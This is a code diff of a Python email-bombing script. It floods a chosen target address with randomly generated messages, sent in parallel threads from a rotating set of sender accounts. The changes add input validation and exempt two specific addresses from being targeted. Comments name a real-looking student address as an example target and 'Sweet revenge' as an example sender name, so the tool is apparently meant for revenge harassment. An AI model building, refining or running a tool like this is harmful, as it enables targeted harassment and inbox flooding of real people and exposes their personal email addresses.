@@ -15,37 +15,53 @@ target = input("Target > ") #sys.argv[1] #"alexzhu23@mittymonarch.com"
 try:
     target.index("@")
 except:
-    print("invalid target, quitting...")
+    print("E: Invalid target, Quitting...")
+    quit()
+if target == "giantsmilodon@gmail.com" or target == "evanalekseyev23@mittymonarch.com":
+    print("E: Invalid target, Quitting...")
     quit()
 
-name = input("Name of sender, default none > ") #sys.argv[2] #"Sweet revenge"
-subject = input("Subject > ")
 
-reps = input("Email count > ") #int(sys.argv[3]) #100
+name = input("Name of sender, default none > ")
+subject = input("Subject, default none > ")
+
+reps = input("Email count, default 50 > ")
+
 if reps == "":
     reps = 50
-else:
+try:
     reps = int(reps)
+except:
+    print("E: Invalid email count. Quitting...")
+    quit()
+
 emailCount = reps
 
-threads = input("Thread count > ") #30
+threads = input("Thread count, default half of email count > ") #30
 if threads == "":
-    threads = int(reps / 2)
-else:
+    threads = reps / 2
+try:
     threads = int(threads)
+except:
+    print("E: Invalid thread count. Quitting...")
+    quit()
+
+if threads > reps:
+    print("E: Thread count cannot be larger than email count. Quitting...")
+    quit()
 
 print("{} emails will be sent to {} using {} threads at a time. Starting...".format(str(reps), str(target), str(threads)))
 
 # generate random amount of text of iter length
 def random_text(iter):
-	bdy = ''
-	for i in range(iter):
-		char = str(chr(randrange(33, 126)))
-		if char != '.':
-			bdy += char
-		else: 
-			bdy += 'k'
-	return bdy
+    bdy = ''
+    for i in range(iter):
+        char = str(chr(randrange(33, 126)))
+        if char != '.':
+            bdy += char
+        else: 
+            bdy += 'k'
+    return bdy
 
 # sends email and executes all dependencies
 # num is the amount of times it has had to execute
@@ -91,7 +107,7 @@ def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
             main(name,
                  list(emails.keys())[emails.keys().index(sent_from)-1],
                  list(emails.values())[emails.keys().index(sent_from)-1],
-                 target, num+1)
+                 target)
 
 if __name__ == "__main__":
     startTime = time.time()
